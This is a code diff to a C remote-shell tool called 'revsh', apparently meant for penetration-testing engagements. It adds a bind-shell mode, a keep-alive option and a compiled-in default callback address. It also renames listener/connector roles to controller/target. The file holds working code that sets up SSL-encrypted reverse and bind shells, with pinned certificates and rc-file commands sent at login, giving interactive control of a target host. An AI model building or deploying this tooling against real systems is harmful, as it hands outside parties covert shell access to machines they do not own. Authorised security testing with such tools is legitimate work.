@@ -11,13 +11,14 @@
  * 2014-08-22: Complete overhaul w/SSL support.
  *
  *
- * The revsh tool is intended to be used as both a local listener and remote client in establishing a remote shell with
- * terminal support. This isn't intended as a replacement for netcat, but rather as a supplementary tool to ease remote
- * interaction during long engagements.
+ * The revsh binary is intended to be used both on the local control host as well as the remote target host. It is
+ * designed to establish a remote shell with terminal support. This isn't intended as a replacement for netcat, but
+ * rather as a supplementary tool to ease remote interaction during long engagements.
  *
  *
  * Features:
  *		* Reverse Shell.
+ *		* Bind Shell.
  *		* Terminal support.
  *		* Handle window resize events.
  *		* Process rc file commands upon login.
@@ -43,13 +44,21 @@
  *
  **********************************************************************************************************************/
 void usage(){
-	fprintf(stderr, "\nusage: %s [-l [-a] [-s SHELL] [-k KEYS_DIR] [-r RC_FILE]] ADDRESS PORT\n", \
+	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-r RC_FILE]] [-b [-k]] ADDRESS:PORT\n", \
 			program_invocation_short_name);
-	fprintf(stderr, "\n\t-l\t\tSetup a listener.\n");
+	fprintf(stderr, "\n\t-c\t\tRun in \"control\" mode. (Default is \"target\" mode.)\n");
 	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is Ephemeral Diffie-Hellman w/cert pinning.)\n");
 	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"/bin/bash\".)\n");
-	fprintf(stderr, "\t-k KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"~/.revsh/keys\".)\n");
+	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"~/.revsh/keys\".)\n");
 	fprintf(stderr, "\t-r RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"~/.revsh/rc\".)\n");
+	fprintf(stderr, "\t-b\t\tStart in \"bind shell\" mode.\t\t\t(Default is \"reverse shell\" mode.)\n");
+	fprintf(stderr, "\t\t\t\tNote:  * The -b flag will need to be given on both the control and target hosts.\n");
+	fprintf(stderr, "\t\t\t\t       * Bind shell mode can also be enabled by invoking the binary as \"bindsh\" instead of \"revsh\".\n");
+	fprintf(stderr, "\t-k\t\tStart the bind shell in \"keep-alive\" mode.\n");
+	fprintf(stderr, "\t-h\t\tPrint this help.\n");
+	fprintf(stderr, "\n\tNote: ADDRESS:PORT is an optional argument and revsh will default to the values built into the binary.\n");
+	fprintf(stderr, "\t      The default ADDRESS:PORT is \"%s\".\n", ADDRESS);
+	fprintf(stderr, "\n\n");
 
 	exit(-1);
 }
@@ -92,8 +101,8 @@ int dummy_verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {
  * Notes:
  *	main() can be broken into three sections:
  *		1) Basic initialization.
- *		2) Setup the listener and call the broker().
- *		3) Setup the connector and call the broker().
+ *		2) Setup the controller and call the broker().
+ *		3) Setup the target and call the broker().
  *
  **********************************************************************************************************************/
 int main(int argc, char **argv){
@@ -125,20 +134,20 @@ int main(int argc, char **argv){
 
 	struct remote_io_helper io;
 
-	BIO *accept;
+	BIO *accept = NULL;
 
 	struct passwd *passwd_entry;
 
 	char *cipher_list = NULL;
 
-#include "keys/connector_key.c"
-	int connector_private_key_len = sizeof(connector_private_key);
+#include "keys/target_key.c"
+	int target_private_key_len = sizeof(target_private_key);
 
-#include "keys/connector_cert.c"
-	int connector_certificate_len = sizeof(connector_certificate);
+#include "keys/target_cert.c"
+	int target_certificate_len = sizeof(target_certificate);
 
-	char *listener_cert_path_head = NULL, *listener_cert_path_tail = NULL;
-	char *listener_key_path_head = NULL, *listener_key_path_tail = NULL;
+	char *controller_cert_path_head = NULL, *controller_cert_path_tail = NULL;
+	char *controller_key_path_head = NULL, *controller_key_path_tail = NULL;
 
 	const EVP_MD *fingerprint_type = NULL;
 	X509 *remote_cert;
@@ -148,10 +157,10 @@ int main(int argc, char **argv){
 	unsigned int allowed_fingerprint_len;
 	unsigned char allowed_fingerprint[EVP_MAX_MD_SIZE];
 
-#include "keys/listener_fingerprint.c"
+#include "keys/controller_fingerprint.c"
 	char *remote_fingerprint_str;
 
-	FILE *connector_fingerprint_fp;
+	FILE *target_fingerprint_fp;
 
 	char *allowed_cert_path_head, *allowed_cert_path_tail;
 
@@ -162,19 +171,19 @@ int main(int argc, char **argv){
 	char *rc_file = NULL;
 
 	int bindshell = 0;
+	int keepalive = 0;
 
 
 	/*
 	 * Basic initialization.
 	 */
 
-	io.listener = 0;
+	io.controller = 0;
 	io.encryption = EDH;
 
-	while((opt = getopt(argc, argv, "pbals:k:r:")) != -1){
+	while((opt = getopt(argc, argv, "pbkacs:d:r:h")) != -1){
 		switch(opt){
 
-			//
 			// plaintext
 			//
 			// The plaintext case is an undocumented "feature" which should be difficult to use.
@@ -184,47 +193,28 @@ int main(int argc, char **argv){
 				io.encryption = PLAINTEXT;
 				break;
 
-			//
 			// bindshell
-			//
-			// This is another undocumented feature, mostly because the language to describe it is
-			// too confusing for a short blurb in the README or the usage() statement.
-			// The calls to the listner (on the local host) and the connector (remote host) are the
-			// same. However, if you pass '-b' to *both* ends, the "listener" (local host) will connect
-			// outbound to the remote connector host. Technically this makes the connection a bindshell
-			// instead of a reverse shell (thus the -b flag). http://en.wikipedia.org/wiki/Shellcode#Remote
-			//
-			// E.g:
-			// 	Normal reverse shell invocation:
-			// 		local host -> "revsh -l ADDRESS PORT"
-			// 		remote host -> "revsh ADDRESS PORT"
-			//
-			// 	Bind shell invocation:
-			// 		remote host -> "revsh -b ADDRESS PORT"
-			// 		local host -> "revsh -l -b ADDRESS PORT"
-			//
-			//  (Note that the bind shell case you have to launch the remote connector first, then the local
-			//	listener secondly.)
-			//
-			// With a rant like this, I think you can see why I've chosen to leave it as "undocumented".
-			//
 			case 'b':
 				bindshell = 1;
+				break;
+
+			case 'k':
+				keepalive = 1;
 				break;
 
 			case 'a':
 				io.encryption = ADH;
 				break;
 
-			case 'l':
-				io.listener = 1;
+			case 'c':
+				io.controller = 1;
 				break;
 
 			case 's':
 				shell = optarg;
 				break;
 
-			case 'k':
+			case 'd':
 				keys_dir = optarg;
 				break;
 
@@ -232,13 +222,21 @@ int main(int argc, char **argv){
 				rc_file = optarg;
 				break;
 
+			case 'h':
 			default:
 				usage();
 		}
 	}
 
-	if((argc - optind) != 2){
-		usage();
+	buff_ptr = strrchr(argv[0], '/');	
+	if(!buff_ptr){
+		buff_ptr = argv[0];
+	}else{
+		buff_ptr++;
+	}
+
+	if(!strncmp(buff_ptr, "bind", 4)){
+		bindshell = 1;
 	}
 
 	switch(io.encryption){
@@ -258,10 +256,15 @@ int main(int argc, char **argv){
 		error(-1, errno, "calloc(%d, %d)", buff_len, (int) sizeof(char));
 	}
 
-	tmp_len = strlen(argv[optind]);
-	memcpy(buff_head, argv[optind], tmp_len);
-	buff_head[tmp_len++] = ':';
-	strcat(buff_head, argv[optind + 1]);
+	if((argc - optind) == 1){
+		tmp_len = strlen(argv[optind]);
+		memcpy(buff_head, argv[optind], tmp_len);
+	}else if((argc - optind) == 0){
+		tmp_len = strlen(ADDRESS);
+		memcpy(buff_head, ADDRESS, tmp_len);
+	}else{
+		usage();
+	}
 
 	SSL_library_init();
 	SSL_load_error_strings();
@@ -297,67 +300,67 @@ int main(int argc, char **argv){
 	 * - Reset local term.
 	 * - Exit.
 	 */
-	if(io.listener){
+	if(io.controller){
 
 		// - Open a socket / setup SSL.
 		if(io.encryption == EDH){
-			if((listener_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
+			if((controller_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
 				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
-						program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
+						program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
 						strerror(errno));
 				exit(-1);
 			}
 
 			if(!keys_dir){
-				memcpy(listener_cert_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));
+				memcpy(controller_cert_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));
 
-				listener_cert_path_tail = index(listener_cert_path_head, '\0');
-				*(listener_cert_path_tail++) = '/';
-				sprintf(listener_cert_path_tail, REVSH_DIR);
-				listener_cert_path_tail = index(listener_cert_path_head, '\0');
-				*(listener_cert_path_tail++) = '/';
-				sprintf(listener_cert_path_tail, KEYS_DIR);
+				controller_cert_path_tail = index(controller_cert_path_head, '\0');
+				*(controller_cert_path_tail++) = '/';
+				sprintf(controller_cert_path_tail, REVSH_DIR);
+				controller_cert_path_tail = index(controller_cert_path_head, '\0');
+				*(controller_cert_path_tail++) = '/';
+				sprintf(controller_cert_path_tail, KEYS_DIR);
 			}else{
-				memcpy(listener_cert_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
+				memcpy(controller_cert_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
 			}
-			listener_cert_path_tail = index(listener_cert_path_head, '\0');
-			*(listener_cert_path_tail++) = '/';
-			sprintf(listener_cert_path_tail, LISTENER_CERT_FILE);
+			controller_cert_path_tail = index(controller_cert_path_head, '\0');
+			*(controller_cert_path_tail++) = '/';
+			sprintf(controller_cert_path_tail, LISTENER_CERT_FILE);
 
 
-			if((listener_cert_path_head - listener_cert_path_tail) > PATH_MAX){
-				fprintf(stderr, "%s: %d: listener cert file: path too long!\n",
-						program_invocation_short_name, io.listener);
+			if((controller_cert_path_head - controller_cert_path_tail) > PATH_MAX){
+				fprintf(stderr, "%s: %d: controller cert file: path too long!\n",
+						program_invocation_short_name, io.controller);
 				exit(-1);
 			}
 
-			if((listener_key_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
+			if((controller_key_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
 				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
-						program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
+						program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
 						strerror(errno));
 				exit(-1);
 			}
 
 			if(!keys_dir){
-				memcpy(listener_key_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));
+				memcpy(controller_key_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));
 
-				listener_key_path_tail = index(listener_key_path_head, '\0');
-				*(listener_key_path_tail++) = '/';
-				sprintf(listener_key_path_tail, REVSH_DIR);
-				listener_key_path_tail = index(listener_key_path_head, '\0');
-				*(listener_key_path_tail++) = '/';
-				sprintf(listener_key_path_tail, KEYS_DIR);
+				controller_key_path_tail = index(controller_key_path_head, '\0');
+				*(controller_key_path_tail++) = '/';
+				sprintf(controller_key_path_tail, REVSH_DIR);
+				controller_key_path_tail = index(controller_key_path_head, '\0');
+				*(controller_key_path_tail++) = '/';
+				sprintf(controller_key_path_tail, KEYS_DIR);
 			}else{
-				memcpy(listener_key_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
+				memcpy(controller_key_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
 			}
-			listener_key_path_tail = index(listener_key_path_head, '\0');
-			*(listener_key_path_tail++) = '/';
-			sprintf(listener_key_path_tail, LISTENER_KEY_FILE);
+			controller_key_path_tail = index(controller_key_path_head, '\0');
+			*(controller_key_path_tail++) = '/';
+			sprintf(controller_key_path_tail, LISTENER_KEY_FILE);
 
 
-			if((listener_key_path_head - listener_key_path_tail) > PATH_MAX){
-				fprintf(stderr, "%s: %d: listener key file: path too long!\n",
-						program_invocation_short_name, io.listener);
+			if((controller_key_path_head - controller_key_path_tail) > PATH_MAX){
+				fprintf(stderr, "%s: %d: controller key file: path too long!\n",
+						program_invocation_short_name, io.controller);
 				exit(-1);
 			}
 		}
@@ -367,28 +370,28 @@ int main(int argc, char **argv){
 
 			if((io.ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
 				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_server_method()): %s\n", \
-						program_invocation_short_name, io.listener, strerror(errno));
+						program_invocation_short_name, io.controller, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if((io.dh = get_dh2048()) == NULL){
 				fprintf(stderr, "%s: %d: get_dh2048(): %s\n", \
-						program_invocation_short_name, io.listener, strerror(errno));
+						program_invocation_short_name, io.controller, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if(!SSL_CTX_set_tmp_dh(io.ctx, io.dh)){
 				fprintf(stderr, "%s: %d: SSL_CTX_set_tmp_dh(%lx, %lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, (unsigned long) io.dh, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, (unsigned long) io.dh, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if(SSL_CTX_set_cipher_list(io.ctx, cipher_list) != 1){
 				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, cipher_list, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, cipher_list, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
@@ -396,27 +399,27 @@ int main(int argc, char **argv){
 			if(io.encryption == EDH){
 				SSL_CTX_set_verify(io.ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, dummy_verify_callback);
 
-				if((retval = SSL_CTX_use_certificate_file(io.ctx, listener_cert_path_head, SSL_FILETYPE_PEM)) != 1){
+				if((retval = SSL_CTX_use_certificate_file(io.ctx, controller_cert_path_head, SSL_FILETYPE_PEM)) != 1){
 					fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
-							program_invocation_short_name, io.listener, (unsigned long) io.ctx, listener_cert_path_head, strerror(errno));
+							program_invocation_short_name, io.controller, (unsigned long) io.ctx, controller_cert_path_head, strerror(errno));
 					ERR_print_errors_fp(stderr);
 					exit(-1);
 				}
 
-				free(listener_cert_path_head);
+				free(controller_cert_path_head);
 
-				if((retval = SSL_CTX_use_PrivateKey_file(io.ctx, listener_key_path_head, SSL_FILETYPE_PEM)) != 1){
+				if((retval = SSL_CTX_use_PrivateKey_file(io.ctx, controller_key_path_head, SSL_FILETYPE_PEM)) != 1){
 					fprintf(stderr, "%s: %d: SSL_CTX_use_PrivateKey_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
-							program_invocation_short_name, io.listener, (unsigned long) io.ctx, listener_key_path_head, strerror(errno));
+							program_invocation_short_name, io.controller, (unsigned long) io.ctx, controller_key_path_head, strerror(errno));
 					ERR_print_errors_fp(stderr);
 					exit(-1);
 				}
 
-				free(listener_key_path_head);
+				free(controller_key_path_head);
 
 				if((retval = SSL_CTX_check_private_key(io.ctx)) != 1){
 					fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
-							program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
+							program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
 					ERR_print_errors_fp(stderr);
 					exit(-1);
 				}
@@ -426,57 +429,57 @@ int main(int argc, char **argv){
 
 		if(bindshell){
 
-			// - Open a network connection back to a listener.
+			// - Open a network connection back to a controller.
 			if((io.connect = BIO_new_connect(buff_head)) == NULL){
 				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
-						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+						program_invocation_short_name, io.controller, buff_head, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if(BIO_do_connect(io.connect) <= 0){
 				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.connect, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 		}else{
 			// - Listen for a connection.
-			printf("Listening...");
+			printf("Listening on %s...", buff_head);
 			fflush(stdout);
 
 			if((accept = BIO_new_accept(buff_head)) == NULL){
 				fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
-						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+						program_invocation_short_name, io.controller, buff_head, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
 				fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if(BIO_do_accept(accept) <= 0){
 				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if(BIO_do_accept(accept) <= 0){
 				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
 
 			if((io.connect = BIO_pop(accept)) == NULL){
 				fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
@@ -488,7 +491,7 @@ int main(int argc, char **argv){
 
 		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
 			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
-					program_invocation_short_name, io.listener, (unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
+					program_invocation_short_name, io.controller, (unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
 			ERR_print_errors_fp(stderr);
 			exit(-1);
 		}
@@ -496,7 +499,7 @@ int main(int argc, char **argv){
 		if(io.encryption){
 			if(!(io.ssl = SSL_new(io.ctx))){
 				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1); 
 			}
@@ -505,7 +508,7 @@ int main(int argc, char **argv){
 
 			if(SSL_accept(io.ssl) < 1){
 				fprintf(stderr, "%s: %d: SSL_accept(%lx): %s\n", \
-						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
+						program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
 				ERR_print_errors_fp(stderr);
 				exit(-1);
 			}
@@ -513,7 +516,7 @@ int main(int argc, char **argv){
 			if(io.encryption == EDH){
 				if((allowed_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
 					fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
-							program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
+							program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
 							strerror(errno));
 					exit(-1);
 				}
@@ -536,35 +539,35 @@ int main(int argc, char **argv){
 
 
 				if((allowed_cert_path_head - allowed_cert_path_tail) > PATH_MAX){
-					fprintf(stderr, "%s: %d: connector fingerprint file: path too long!\n",
-							program_invocation_short_name, io.listener);
+					fprintf(stderr, "%s: %d: target fingerprint file: path too long!\n",
+							program_invocation_short_name, io.controller);
 					exit(-1);
 				}
 
-				if((connector_fingerprint_fp = fopen(allowed_cert_path_head, "r")) == NULL){
+				if((target_fingerprint_fp = fopen(allowed_cert_path_head, "r")) == NULL){
 					fprintf(stderr, "%s: %d: fopen(%s, 'r'): %s\n",
-							program_invocation_short_name, io.listener, allowed_cert_path_head, strerror(errno));
+							program_invocation_short_name, io.controller, allowed_cert_path_head, strerror(errno));
 					exit(-1);
 				}
 
 				free(allowed_cert_path_head);
 
-				if((allowed_cert = PEM_read_X509(connector_fingerprint_fp, NULL, NULL, NULL)) == NULL){
+				if((allowed_cert = PEM_read_X509(target_fingerprint_fp, NULL, NULL, NULL)) == NULL){
 					fprintf(stderr, "%s: %d: PEM_read_X509(%lx, NULL, NULL, NULL): %s\n", \
-							program_invocation_short_name, io.listener, (unsigned long) connector_fingerprint_fp, strerror(errno));
+							program_invocation_short_name, io.controller, (unsigned long) target_fingerprint_fp, strerror(errno));
 					ERR_print_errors_fp(stderr);
 					exit(-1);
 				}
 
-				if(fclose(connector_fingerprint_fp)){
+				if(fclose(target_fingerprint_fp)){
 					fprintf(stderr, "%s: %d: fclose(%lx): %s\n",
-							program_invocation_short_name, io.listener, (unsigned long) connector_fingerprint_fp, strerror(errno));
+							program_invocation_short_name, io.controller, (unsigned long) target_fingerprint_fp, strerror(errno));
 					exit(-1);
 				}
 
 				if(!X509_digest(allowed_cert, fingerprint_type, allowed_fingerprint, &allowed_fingerprint_len)){
 					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
-							program_invocation_short_name, io.listener, \
+							program_invocation_short_name, io.controller, \
 							(unsigned long) allowed_cert, \
 							(unsigned long) fingerprint_type, \
 							(unsigned long) allowed_fingerprint, \
@@ -576,7 +579,7 @@ int main(int argc, char **argv){
 
 				if((remote_cert = SSL_get_peer_certificate(io.ssl)) == NULL){
 					fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
-							program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
+							program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
 					ERR_print_errors_fp(stderr);
 					exit(-1);
 				}
@@ -589,7 +592,7 @@ int main(int argc, char **argv){
 
 				if(!X509_digest(remote_cert, fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
 					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
-							program_invocation_short_name, io.listener, \
+							program_invocation_short_name, io.controller, \
 							(unsigned long) remote_cert, \
 							(unsigned long) fingerprint_type, \
 							(unsigned long) remote_fingerprint, \
@@ -607,14 +610,14 @@ int main(int argc, char **argv){
 
 				if(allowed_fingerprint_len != remote_fingerprint_len){
 					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
-							program_invocation_short_name, io.listener);
+							program_invocation_short_name, io.controller);
 					exit(-1);
 				}
 
 				for(i = 0; i < (int) allowed_fingerprint_len; i++){
 					if(allowed_fingerprint[i] != remote_fingerprint[i]){
 						fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
-								program_invocation_short_name, io.listener);
+								program_invocation_short_name, io.controller);
 						exit(-1);
 					}
 				}
@@ -639,21 +642,21 @@ int main(int argc, char **argv){
 		*(buff_tail++) = (char) ST;
 
 		if((buff_tail - buff_head) >= buff_len){
-			print_error(&io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io.listener);
+			print_error(&io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io.controller);
 			exit(-1);
 		}
 
 		tmp_len = strlen(buff_head);
 		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
 			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
 			exit(-1);
 		}
 
 		if(io_bytes != (buff_tail - buff_head)){
 			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) buff_head, buff_len);
 			exit(-1);
 		}
@@ -662,7 +665,7 @@ int main(int argc, char **argv){
 		tmp_len = strlen(DEFAULT_ENV);
 		if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
 			print_error(&io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					tmp_len + 1, (int) sizeof(char), strerror(errno));
 			exit(-1);
 		}
@@ -671,7 +674,7 @@ int main(int argc, char **argv){
 
 		if((exec_envp = string_to_vector(env_string)) == NULL){
 			print_error(&io, "%s: %d: string_to_vector(%s): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					env_string, strerror(errno));
 			exit(-1);
 		}
@@ -685,7 +688,7 @@ int main(int argc, char **argv){
 
 			if((buff_tail - buff_head) >= buff_len){
 				print_error(&io, "%s: %d: Environment string too long.\n", \
-						program_invocation_short_name, io.listener);
+						program_invocation_short_name, io.controller);
 				exit(-1);
 			}else if(buff_tail != (buff_head + 1)){
 				*(buff_tail++) = ' ';
@@ -712,21 +715,21 @@ int main(int argc, char **argv){
 
 		if((buff_tail - buff_head) >= buff_len){
 			print_error(&io, "%s: %d: Environment string too long.\n", \
-					program_invocation_short_name, io.listener);
+					program_invocation_short_name, io.controller);
 			exit(-1);
 		}
 
 		tmp_len = strlen(buff_head);
 		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
 			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
 			exit(-1);
 		}
 
 		if(io_bytes != (buff_tail - buff_head)){
 			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) buff_head, buff_len);
 			exit(-1);
 		}
@@ -735,7 +738,7 @@ int main(int argc, char **argv){
 		// - Send initial termios data.
 		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
 			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &tty_winsize, strerror(errno));
 			exit(-1);
 		}
@@ -747,7 +750,7 @@ int main(int argc, char **argv){
 		if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
 						tty_winsize.ws_row, tty_winsize.ws_col)) < 0){
 			print_error(&io, "%s: %d: snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
 			exit(-1);
 		}
@@ -758,14 +761,14 @@ int main(int argc, char **argv){
 		tmp_len = strlen(buff_head);
 		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
 			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
 			exit(-1);
 		}
 
 		if(io_bytes != tmp_len){
 			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
 			exit(-1);
 		}
@@ -773,7 +776,7 @@ int main(int argc, char **argv){
 		// - Set local terminal to raw. 
 		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
 			print_error(&io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &saved_termios_attrs, strerror(errno));
 			exit(-1);
 		}
@@ -791,7 +794,7 @@ int main(int argc, char **argv){
 
 		if((retval = tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs)) == -1){
 			print_error(&io, "%s: %d: tcsetattr(STDIN_FILENO, TCSANOW, %lx): %s\n", \
-					program_invocation_short_name, io.listener, \
+					program_invocation_short_name, io.controller, \
 					(unsigned long) &new_termios_attrs, strerror(errno));
 			exit(-1);
 		}	
@@ -803,7 +806,7 @@ int main(int argc, char **argv){
 		// - Send the commands in the rc file.
 		if((rc_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
 			print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
-					program_invocation_short_name, io.listener, PATH_MAX, (int) sizeof(char), \
+					program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
 					strerror(errno));
 			exit(-1);
 		}
@@ -822,7 +825,7 @@ int main(int argc, char **argv){
 
 			if((rc_path_head - rc_path_tail) > PATH_MAX){
 				print_error(&io, "%s: %d: rc file: path too long!\n",
-						program_invocation_short_name, io.listener);
+						program_invocation_short_name, io.controller);
 				exit(-1);
 			}
 		}
@@ -835,7 +838,7 @@ int main(int argc, char **argv){
 			while((io_bytes = read(rc_fd, buff_head, buff_len))){
 				if(io_bytes == -1){
 					print_error(&io, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
-							program_invocation_short_name, io.listener, \
+							program_invocation_short_name, io.controller, \
 							rc_fd, (unsigned long) buff_head, buff_len, strerror(errno));
